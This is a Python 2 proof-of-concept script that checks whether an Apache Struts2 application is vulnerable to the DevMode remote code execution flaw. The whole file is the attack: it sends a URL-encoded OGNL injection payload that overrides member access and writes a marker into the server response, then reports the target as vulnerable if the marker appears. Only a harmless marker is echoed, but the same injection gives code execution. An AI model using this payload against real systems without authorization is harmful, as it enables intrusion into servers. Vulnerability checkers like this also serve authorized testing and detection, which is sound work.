#!/usr/bin/env python
# -*- coding:utf-8 -*-
# S2-DevMode POC
# Author: CF_HB
# 来源：http://zone.wooyun.org/content/28416
# 时间：2016年7月14日

import requests
import argparse

banner = u'''\
# S2-DevMode POC
# Author:CF_HB
# 时间：2016年7月14日
#使用说明：
# 1、检测
    python S2-DevMode_POC.py -u http://xxx.xxx.xxx.xxx/xxxxx.action
'''
def verity(url):
    S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
    try:
        print banner
        poc_url = url+S2_DevMode_POC
        print "[checking] " + url
        s = requests.session()
        res = s.post(poc_url, timeout=4)
        if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
            if len(res.content) <40: # may be 34 length
                print "{url} is vulnerable S2_DevMode_RCE.".format(url=url)
            else:
                print "{url} is no vulnerable..".format(url=url)
        else:
            print "{url} is no vulnerable..".format(url=url)
    except Exception, e:
        print "Failed to connection target, try again.."
parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
args = parser.parse_args()
args_dict = args.__dict__

try:
    shellpath = None
    if not (args_dict['u'] == None):
        url = args_dict['u']
    verity(url)
except Exception,e:
    print parser.print_usage()
    exit(-1)
